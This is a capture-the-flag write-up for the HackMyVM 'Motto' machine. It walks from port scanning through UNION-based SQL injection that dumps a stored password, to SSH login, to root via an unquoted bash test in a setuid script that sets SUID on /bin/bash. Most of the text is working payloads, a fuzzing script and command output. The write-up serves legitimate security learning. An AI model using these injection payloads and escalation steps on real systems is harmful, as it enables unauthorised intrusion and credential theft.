# Motto

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.55:22
Open 10.0.2.55:80
Open 10.0.2.55:9090
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.55

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: \xE7\x82\xB9\xE5\x87\xBB\xE6\x96\xB9\xE5\x9D\x97\xE5\xB0\x8F\xE6\xB8\xB8\xE6\x88\x8F
9090/tcp open  http    syn-ack Golang net/http server
|_http-title: Mottos
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 11 Sep 2025 15:49:31 GMT
|     <!DOCTYPE html>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
| http-methods: 
|_  Supported Methods: GET POST
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
:::

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/motto/writeup.png)

Nothing
```bash
└─$ feroxbuster -u http://motto.hmv -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 274
200      GET       86l      191w     1908c http://motto.hmv/index.php
```

## HTTP (9090)

![writeup-1.png](/assets/pentest/hackmyvm/motto/writeup-1.png)

```bash
└─$ feroxbuster -u http://motto.hmv:9090 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 274
200      GET        1l        1w       68c http://motto.hmv:9090/mymottos
200      GET        1l        1w       68c http://motto.hmv:9090/myinfo
200      GET      216l      400w     5973c http://motto.hmv:9090/
200      GET       64l      155w     2241c http://motto.hmv:9090/static/js/login.js
200      GET       35l       78w     1304c http://motto.hmv:9090/login
200      GET       71l      178w     2607c http://motto.hmv:9090/static/js/register.js
200      GET       33l       80w     1326c http://motto.hmv:9090/register
301      GET        2l        3w       43c http://motto.hmv:9090/static => http://motto.hmv:9090/static/
```

You're able to register and then start posting Mottos.
- `/mymottos` shows your mottos only
- `/` shows all mottos from anyone
- `/myinfo` shows your name and you're able to change your nickname
	- Interestingly when you change nickname to someone else you see their mottos in `/myinfo`

I was fuzzing for things like XSS, SSTI or anything. When I did `test02';")}` as nickname something changed.

![writeup-2.png](/assets/pentest/hackmyvm/motto/writeup-2.png)

The HTML table is cut of, as well as Javascript which allows you to add new Mottos.

```python
from requests import Session

URL = 'http://motto.hmv:9090'
AUTH = 'test03'

with Session() as session:
    session.post(f'{URL}/register', data={'username': AUTH, 'password': AUTH, 'nickname': AUTH})
    session.post(f'{URL}/login', json={'username': AUTH, 'password': AUTH})
    
    for i in range(256):
        char = chr(i)
        session.post(f'{URL}/changeNickName', data={'nickname': f'{AUTH}{char}'})
        resp = session.get(f'{URL}/mymottos')
        print(f'Char: {char.strip()} ({hex(i)}), Length: {len(resp.text)}')
```

```bash
└─$ py -u fuzz.py | grep -av 4723
Char:  (0x20), Length: 4949
Char: ' (0x27), Length: 3079
Char: \ (0x5c), Length: 3079
```

### SQLi

Right, there's SQL injection in there because `test' OR 1=1 -- -` returns all of the mottos.

```
└─$ py sqli.py
Nickname: x' UNION SELECT 1,2 -- -
┌──────────┬─────────┐
│ 用户名   │ Motto   │
├──────────┼─────────┤
└──────────┴─────────┘
Nickname: x' UNION SELECT 1,2,3 -- -
┌──────────┬─────────┐
│   用户名 │   Motto │
├──────────┼─────────┤
│        2 │       3 │
└──────────┴─────────┘
Nickname: x' UNION SELECT 1,2,version() -- -
┌──────────┬───────────────────────────┐
│   用户名 │ Motto                     │
├──────────┼───────────────────────────┤
│        2 │ 10.5.23-MariaDB-0+deb11u1 │
└──────────┴───────────────────────────┘
Nickname: x' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata -- -
┌──────────┬─────────────────────────────────────────────────┐
│   用户名 │ Motto                                           │
├──────────┼─────────────────────────────────────────────────┤
│        2 │ information_schema,performance_schema,mysql,sql │
└──────────┴─────────────────────────────────────────────────┘
Nickname: x' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="sql" -- -
┌──────────┬────────────────────────────┐
│   用户名 │ Motto                      │
├──────────┼────────────────────────────┤
│        2 │ motto_infos,register_infos │
└──────────┴────────────────────────────┘
Nickname: x' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="register_infos" -- -
┌──────────┬────────────────────────────────────┐
│   用户名 │ Motto                              │
├──────────┼────────────────────────────────────┤
│        2 │ user_id,nickname,username,password │
└──────────┴────────────────────────────────────┘
Nickname: x' UNION SELECT 1,username,password FROM sql.register_infos -- -
┌─────────────────┬─────────────────┐
│ 用户名          │ Motto           │
├─────────────────┼─────────────────┤
│ admin is no use │ admin is no use │
│ RedBean         │ cannotforgetyou │
│ test02          │ test02          │
│ test01          │ test01          │
└─────────────────┴─────────────────┘
```

## SSH

```bash
└─$ sshpass -p 'cannotforgetyou' ssh redbean@motto.hmv
redbean@motto:~$ id
uid=1000(redbean) gid=1000(redbean) groups=1000(redbean)
```

### User.txt

```bash
redbean@motto:~$ cat user.txt
flag{796f756765747265646265616e}
```

## Privilege Escalation

```bash
redbean@motto:~$ sudo -l
Sorry, user redbean may not run sudo on motto.
redbean@motto:~$ find / -perm -4000 2>/dev/null
...
/opt/run_newsh
```

```bash
redbean@motto:~$ file /opt/run_newsh
/opt/run_newsh: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5871380f0b8a03dea808046e697b19b030d1a5d, for GNU/Linux 3.2.0, not stripped
redbean@motto:~$ /opt/run_newsh
Usage: /opt/run_newsh <arg>
redbean@motto:~$
redbean@motto:~$ /opt/run_newsh id

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 1.4.234)
 ● Module B status: OK (ver 5.15.210)
 ● Module C status: OK (ver 4.1.116)
Random seed value: 28640
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 4 seconds
>> Waiting T-4 seconds...
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
System stable.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 76
/opt/new.sh: line 60: bc: command not found
    CPU load average:
    Uptime (hours): 17
```

Path injection doesn't seem to work
```bash
redbean@motto:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /tmp/bc
redbean@motto:~$ chmod 777 /tmp/bc
redbean@motto:~$ export PATH=/tmp:$PATH
redbean@motto:~$ /opt/run_newsh test
/opt/new.sh: line 60: bc: command not found
```

`argv[1]` is used in script for something, but for what? or how?!
```bash
redbean@motto:~$ python3 -c 'print(__import__("string").printable)'
0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~

redbean@motto:~$ /opt/run_newsh $'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c' 1>/dev/null
/opt/new.sh: line 20: [: too many arguments
/opt/new.sh: line 60: bc: command not found
```

Randomly did `find` and it showed there's a hidden backup directory
```bash
redbean@motto:~$ find . -type f -ls
   527401      4 -rw-r--r--   1 redbean  redbean       220 Apr 18  2019 ./.bash_logout
   527405      4 -r--r--r--   1 root     root         1709 Jul 31 02:46 ./.backup/new.sh
   527409      4 -rw-r--r--   1 root     root          509 Jul 31 08:27 ./.backup/run_newsh.c
   527402      4 -rw-r--r--   1 redbean  redbean      3526 Apr 18  2019 ./.bashrc
   527369      4 -rw-r--r--   1 root     root           33 Jul 31 02:35 ./user.txt
   527403      4 -rw-r--r--   1 redbean  redbean       807 Apr 18  2019 ./.profile
   527411      8 -rw-------   1 redbean  redbean      6958 Sep 11 13:42 ./.viminfo
```

:sigh:
```bash
redbean@motto:~$ cat ./.backup/new.sh | grep '\$1'
[ -n "$1" ] || exit 1
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && chmod +s /bin/bash
```

```bash
redbean@motto:~$ /opt/run_newsh $'flag' >/dev/null && ls -lh /bin/bash
redbean@motto:~$ /opt/run_newsh $'flag ' >/dev/null && ls -lh /bin/bash
/opt/new.sh: line 60: bc: command not found
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash
```

If `argv[1]` is flag then we get SUID bash, but if it's exactly 4 characters flag then we don't get the flag. Easiest bypass here is to use spaces anywhere around. You can also inject `test` command queries to change condition to be something else.
```bash
redbean@motto:~$ /opt/run_newsh " flag" >/dev/null && ls -lh /bin/bash && /bin/bash -p -c 'chmod -s /bin/bash' && ls -lh /bin/bash
/opt/new.sh: line 60: bc: command not found
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash
-rwxr-xr-x 1 root root 1.2M Apr 18  2019 /bin/bash

redbean@motto:~$ /opt/run_newsh "flag " >/dev/null && ls -lh /bin/bash && /bin/bash -p -c 'chmod -s /bin/bash' && ls -lh /bin/bash
/opt/new.sh: line 60: bc: command not found
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash
-rwxr-xr-x 1 root root 1.2M Apr 18  2019 /bin/bash

redbean@motto:~$ /opt/run_newsh " flag " >/dev/null && ls -lh /bin/bash && /bin/bash -p -c 'chmod -s /bin/bash' && ls -lh /bin/bash
/opt/new.sh: line 60: bc: command not found
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash
-rwxr-xr-x 1 root root 1.2M Apr 18  2019 /bin/bash

redbean@motto:~$ /opt/run_newsh "x -o ''" >/dev/null && ls -lh /bin/bash && /bin/bash -p -c 'chmod -s /bin/bash' && ls -lh /bin/bash
/opt/new.sh: line 60: bc: command not found
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash
-rwxr-xr-x 1 root root 1.2M Apr 18  2019 /bin/bash
```

**[BashPitfalls.md](https://gist.github.com/dsoares/7608d68538be606f3b6a6f0c557bfc8c)**
- `[ $foo = "bar" ]`: [https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D](https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D)

```bash
redbean@motto:~$ /opt/run_newsh "x -o ''" >/dev/null && /bin/bash -p
/opt/new.sh: line 60: bc: command not found
bash-5.0# id
uid=1000(redbean) gid=1000(redbean) euid=0(root) egid=0(root) groups=0(root),1000(redbean)
```

### Root.txt

```bash
bash-5.0# cd /root
bash-5.0# cat root.txt
flag{796f75676574726f6f74627574796f7563616e6e6f74676574686572}
```